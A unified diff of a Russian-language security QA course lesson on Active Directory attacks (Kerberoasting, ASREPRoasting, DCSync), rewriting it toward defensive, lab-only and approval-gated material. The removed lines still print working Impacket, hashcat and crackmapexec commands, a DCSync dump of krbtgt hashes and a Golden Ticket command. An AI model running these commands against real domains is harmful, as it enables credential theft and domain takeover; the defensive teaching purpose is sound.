@@ -12,6 +12,17 @@
 
 **Связь с книгами:** PTES, OWASP Testing Guide, CVSS и «PyCharm. Профессиональная работа на Python 2024» для reporting, Git/VCS, Markdown evidence и процесса.
 
+**Основной источник:** «PyCharm. Профессиональная работа на Python 2024» и «Паттерны разработки на Python».
+
+**Дополнительные источники:** Все книги курса как справочник для финального Security QA assessment и automation appendix.
+
+**Что берем из источника:** strategy, RoE, evidence policy, triage, remediation, retest, security regression и ownership.
+
+**Как это превращается в SDET/Security QA навык:** собрать полный безопасный assessment package для Slider AI olddev.
+
+**Что нельзя переносить на Slider AI без отдельного разрешения:** финальный проект остается в рамках `education/slider_ai_scope.md`; любые intrusive checks требуют отдельного approval.
+
+
 **Процессный артефакт:** `REMEDIATION_BACKLOG.md` или `RETEST_PLAN.md`: приоритизация, владелец, retest evidence.
 
 **Безопасная цель:** Учебный scope, подписанный RoE, собственная лаборатория или платформа с явным разрешением. Реальные организации только с письменным согласием.
@@ -27,6 +38,36 @@
 **Эталонный вывод:** Сданный артефакт: отчет, чек-лист, RoE, матрица рисков или презентация с проверяемыми доказательствами.
 
 **Критерии сдачи:** Зачет: полный артефакт по шаблону. Отлично: ясная бизнес-интерпретация, приоритизация и план remediation.
+
+## Reading pack из книг курса
+
+Этот раздел не является заданием “пойди и найди теорию в книгах”. Книги использованы автором курса для подготовки лекции `Занятие 70. Active Directory атака: Kerberoasting, ASREPRoasting, DCSync`, а студент получает самодостаточное объяснение в разделах `Source-driven theory` и `Теория`.
+
+- `docs/socraticode/pycharm-professional-python-2024-pages/`
+- `docs/socraticode/architecture-patterns-python-pages/`
+
+Конкретные страницы для этого блока: `pycharm-professional-python-2024-pages/page-178.md`-`page-209.md`; `page-437.md`-`page-466.md`; `architecture-patterns-python-pages/page-038.md`-`page-129.md`.
+
+Что обязана объяснить лекция на основе этих книг:
+
+1. Термины и команды, которые прямо поддерживают тему урока.
+2. Инженерный принцип, который переносится из SDET в Security QA.
+3. Ограничение безопасности: что нельзя делать на Slider AI без approval.
+4. Пример, который превращается в evidence, helper, checklist или process artifact.
+
+Если книга описывает опасную технику, она переносится только в lab-only или defensive interpretation. Студент не должен обращаться к книгам, чтобы понять базовую теорию текущего урока.
+
+## Source-driven theory
+
+Этот урок опирается на книжные источники курса как на базу, а не как на факультативное чтение. Из источников берется практическая дисциплина: strategy, RoE, evidence policy, triage, remediation, retest, security regression и ownership. Для SDET это важно потому, что security-проверка должна быть воспроизводимой, объяснимой и пригодной для отчета, а не превращаться в набор разрозненных команд.
+
+Книжный материал в уроке используется в трех шагах:
+
+1. Понять термин или технику на безопасном примере.
+2. Перевести идею в QA-действие: test case, observation, evidence, helper или process artifact.
+3. Отделить разрешенную практику от действий, которые требуют отдельного approval.
+
+Граница для Slider AI: финальный проект остается в рамках `education/slider_ai_scope.md`; любые intrusive checks требуют отдельного approval. Если нужная техника выходит за эту границу, результат урока оформляется как `requires approval`, lab-only practice или defensive recommendation.
 
 ## Теория
 
@@ -62,12 +103,11 @@ Active Directory (AD) — служба каталогов от Microsoft, исп
 **Кто уязвим:**
 Сервисные аккаунты (Service Accounts), у которых настроен SPN (Service Principal Name) и имеют слабые пароли.
 
-**Процесс атаки:**
-1. Получить доступ к домену (любой пользователь домена)
-2. Найти аккаунты с SPN: `setspn -T DOMAIN -Q */*`
-3. Запросить TGS для каждого SPN: `GetUserSPNs.py DOMAIN/user:password -dc-ip [DC_IP] -request`
-4. Сохранить полученные хеши
-5. Взломать хеши оффлайн: `hashcat -m 13100 hashes.txt rockyou.txt`
+**Процесс риска на уровне понимания:**
+1. У атакующего уже есть легитимная доменная учетная запись в учебной AD-lab.
+2. Он ищет сервисные аккаунты с SPN.
+3. Он получает Kerberos service ticket и анализирует, можно ли подобрать слабый пароль оффлайн.
+4. Для Product Security QA важен не запуск атаки на продукт, а checklist защиты: длинные случайные пароли service accounts, gMSA, monitoring, rotation и least privilege.
 
 **Инструменты:**
 - Impacket: `GetUserSPNs.py`
@@ -82,10 +122,10 @@ Active Directory (AD) — служба каталогов от Microsoft, исп
 **Кто уязвим:**
 Пользователи с флагом `DONT_REQ_PREAUTH` (UserAccountControl = 4194304).
 
-**Процесс атаки:**
-1. Перечислить пользователей с DONT_REQ_PREAUTH: `GetNPUsers.py DOMAIN/ -dc-ip [DC_IP] -usersfile users.txt`
-2. Получить AS_REP ответы (хеши)
-3. Взломать хеши: `hashcat -m 18200 hashes.txt rockyou.txt`
+**Процесс риска на уровне понимания:**
+1. Найти учетные записи без Kerberos pre-authentication в учебной AD-lab.
+2. Понять, почему ответ AS_REP может стать материалом для offline guessing.
+3. Для Product Security QA зафиксировать defensive expectation: pre-authentication включен, слабые пароли запрещены, события аномалий мониторятся.
 
 **Инструменты:**
 - Impacket: `GetNPUsers.py`
@@ -101,10 +141,10 @@ Active Directory (AD) — служба каталогов от Microsoft, исп
 - Enterprise Admins
 - Аккаунты с правами DS-Replication-Get-Changes и DS-Replication-Get-Changes-All
 
-**Процесс атаки:**
-1. Компрометация аккаунта с правами репликации
-2. Выполнение DCSync: `secretsdump.py DOMAIN/user:password@DC_IP -dc-ip DC_IP -just-dc-user krbtgt`
-3. Получение хешей (включая krbtgt для Golden Ticket)
+**Процесс риска на уровне понимания:**
+1. Компрометация аккаунта с правами репликации.
+2. Попытка имитировать контроллер домена и запросить репликацию секретов.
+3. Для Product Security QA это не практическая команда, а high-risk scenario для вопросов владельцам AD/SSO: кто имеет replication rights, как это мониторится, как выполняется incident response.
 
 **Инструменты:**
 - Impacket: `secretsdump.py`
@@ -126,12 +166,13 @@ pip3 install crackmapexec
 - Выполнение команд на скомпрометированных хостах
 - Сбор данных для BloodHound (через модули)
 
-**Пример использования:**
+**Пример lab-only awareness, не запускать вне разрешенной AD-lab:**
 ```bash
-# Брутфорс SMB
-crackmapexec smb 192.168.1.0/24 -u user.txt -p password.txt
-# Сбор информации о домене
-crackmapexec smb 192.168.1.0/24 -u 'guest' -p '' --shares
+# Anti-example для Product QA:
+# crackmapexec smb <lab-subnet> -u <lab-user> -p <lab-password>
+#
+# В курсе по Slider AI это оформляется как forbidden/approval-required action,
+# а не как команда для рабочего стенда.
 ```
 
 ### BloodHound
@@ -176,6 +217,17 @@ bloodhound-python -u user -p password -d DOMAIN.local -dc dc01.domain.local -c a
 
 BloodHound работает на M2 natively через `brew install --cask bloodhound` или Docker.
 
+## Guided practice
+
+1. Выберите финальный артефакт урока: RoE, checklist, finding, score, backlog, retest или appendix.
+2. Заполните шаблон процесса на безопасном Slider AI-примере без секретов.
+3. Свяжите результат с продуктовым риском, owner action и проверкой исправления.
+4. Добавьте артефакт в итоговый assessment package и отметьте limitations.
+
+### Эталон самостоятельной работы
+
+К концу guided practice у студента есть короткий Markdown-артефакт: цель проверки, выполненные шаги, sanitized evidence, интерпретация результата, границы применимости и следующий безопасный шаг.
+
 ## Практическое занятие
 
 ### Настройка лаборатории AD
@@ -199,59 +251,37 @@ BloodHound работает на M2 natively через `brew install --cask blo
 
 Для MacBook Air M2 (8GB) основной путь этого урока — HackTheBox Academy AD Path или TryHackMe AD Rooms. Локальные AD-лаборатории из нескольких Windows VM считать углублением вне базовой конфигурации.
 
-### Выполнение атак
+### Lab-only awareness: как читать write-up, не превращая его в действие по продукту
 
-#### Kerberoasting
+Этот раздел не является обязательным hands-on путем для MacBook Air M2 8GB и не применяется к Slider AI. Используйте его только для разбора write-up в HTB/THM/INE AD lab, где такие техники явно разрешены.
+
+#### Kerberoasting risk flow
 
 ```bash
-# Убедитесь, что вы в домене (через proxychains или напрямую)
-# 1. Получение списка SPN
-proxychains setspn -T CORP -Q */*
-
-# 2. Запрос TGS через Impacket (от имени пользователя в домене)
-python3 GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.100 -request
-
-# Вывод будет содержать хеши, например:
-# $krb5tgs$23$*user1$CORP$MSSQLSvc/web.server.com:1433*$...
-
-# 3. Сохраните хеши в файл hashes.txt
-
-# 4. Брутфорс с hashcat
-hashcat -m 13100 hashes.txt rockyou.txt --force
-
-# 5. Если пароль найден:
-#    Пользователь: user1
-#    Пароль: Password123
+# LAB-ONLY PSEUDOCODE:
+# 1. Identify service accounts with SPN in the authorized AD lab.
+# 2. Request a service ticket in the lab.
+# 3. Record defensive evidence: weak service-account policy, missing monitoring, excessive privileges.
+# 4. Do not run this flow against Slider AI or any real AD without written RoE.
 ```
 
-#### ASREPRoasting
+#### ASREPRoasting risk flow
 
 ```bash
-# 1. Поиск пользователей без preauth
-python3 GetNPUsers.py CORP/ -dc-ip 192.168.1.100 -usersfile valid_users.txt
-
-# Или если есть учетные данные:
-python3 GetNPUsers.py CORP/user:password -dc-ip 192.168.1.100 -request
-
-# Вывод будет содержать AS_REP хеши:
-# $krb5asrep$23$user2@CORP:...
-
-# 2. Брутфорс с hashcat
-hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
+# LAB-ONLY PSEUDOCODE:
+# 1. In an authorized AD lab, identify accounts without pre-authentication.
+# 2. Document why this creates offline guessing risk.
+# 3. Convert the result into a defensive checklist: enable pre-auth, monitor events, enforce password policy.
 ```
 
-#### DCSync (после получения прав админа)
+#### DCSync risk flow
 
 ```bash
-# Используя Impacket secretsdump
-python3 secretsdump.py CORP/Administrator:password@192.168.1.100 -dc-ip 192.168.1.100 -just-dc
-
-# Это выведет все хеши, включая:
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
-# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:25b2076cda3bfd6209161a6c78a69c1c:::
-
-# Теперь можно сделать Golden Ticket:
-# python3 ticketer.py -domain-sid S-1-5-21-xxx -domain CORP -spn krbtgt -password NTLM_HASH administrator
+# LAB-ONLY PSEUDOCODE:
+# 1. In an authorized AD lab, review which accounts have replication rights.
+# 2. Explain why replication rights can expose domain secrets.
+# 3. Do not collect or print hashes in course artifacts.
+# 4. Document defensive controls: least privilege, alerting, Event ID review, krbtgt rotation procedure.
 ```
 
 ### BloodHound сбор данных и анализ
@@ -281,11 +311,15 @@ bloodhound
 
 ## Примеры вывода
 
-Минимальный эталонный вывод для сдачи:
+Минимальный эталонный артефакт для сдачи:
 
-```text
-$ <команда из практики>
-<3-10 строк фактического вывода из разрешенной среды>
+```markdown
+Environment: macOS native / Kali ARM64 VM / cloud lab / Slider AI olddev
+Target: <разрешенная учебная цель или https://olddev.slider-ai.ru>
+Action: <выполненная безопасная команда или ручной шаг>
+Evidence: <санитизированный фрагмент вывода, скриншота или HTTP history>
+Result status: finding / observation / not reproducible / not applicable / requires approval
+Next step: <retest, remediation, approval request или lab-only follow-up>
 ```
 
 В отчете студент указывает среду выполнения, безопасную цель, команду или ручные шаги и коротко объясняет, какая строка подтверждает результат.
@@ -304,15 +338,15 @@ $ <команда из практики>
 
 ## Задачи для самостоятельного выполнения
 
-1. **Kerberoasting Lab**: Настройте в тестовом домене пользователя с SPN и слабым паролем. Выполните Kerberoasting атаку, взломайте хеш. Напишите пошаговый отчет.
+1. **Kerberoasting defensive lab**: В HTB/THM/INE AD lab разберите готовый write-up или выполните разрешенную lab-задачу. В отчете не публикуйте хеши/пароли; опишите риск, признаки detection и remediation.
 
-2. **ASREPRoasting Lab**: Найдите (или настройте) пользователя с флагом DONT_REQ_PREAUTH. Выполните ASREPRoasting, получите пароль. Опишите, как защититься от этой атаки.
+2. **ASREPRoasting defensive lab**: Опишите, почему `DONT_REQ_PREAUTH` опасен, какие политики должны быть включены и какие события мониторить. Hands-on только в cloud lab с явным разрешением.
 
 3. **BloodHound Analysis**: Установите BloodHound, соберите данные из тестового домена (или GOAD). Найдите 3 пути к Domain Admin. Сделайте скриншоты графов.
 
 4. **Mitigation Research**: Напишите рекомендации по защите от Kerberoasting, ASREPRoasting и DCSync. Что должны делать администраторы? Какие политики настроить? Какие инструменты мониторинга использовать?
 
-5. **Mimikatz DCSync**: Изучите, как работает DCSync через Mimikatz. Напишите пошаговую инструкцию: как получить хеши через Mimikatz (на скомпрометированном DC или с правами DA). Укажите, какие события в Windows Event Log генерируются при DCSync (Event ID 4662, 4624).
+5. **DCSync detection**: Изучите, какие права и события связаны с DCSync. Напишите detection/remediation checklist, не описывая пошаговое получение хешей и не публикуя секреты.
 
 ## Частые ошибки
 
@@ -358,3 +392,19 @@ Markdown-запись по шаблону из `education/slider_ai_scope.md`: �
 ### Критерий готовности
 
 Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.
+
+## Rubric
+
+| Уровень | Что должно быть сдано |
+|---|---|
+| Зачет | Выполнен обязательный путь новичка, есть sanitized evidence, действия не выходят за scope |
+| Хорошо | Есть объяснение риска или процесса, аккуратные шаги воспроизведения и корректный статус результата |
+| Отлично | Результат связан с `Final Security QA Assessment`, remediation/retest или automation appendix |
+
+## Self-check
+
+1. Какая SDET-компетенция используется в уроке?
+2. Какая часть объяснения опирается на книги курса?
+3. Где проходит безопасная граница для Slider AI?
+4. Какой артефакт можно показать команде без раскрытия секретов?
+5. Что нужно вынести в углубление, lab-only или отдельный approval?
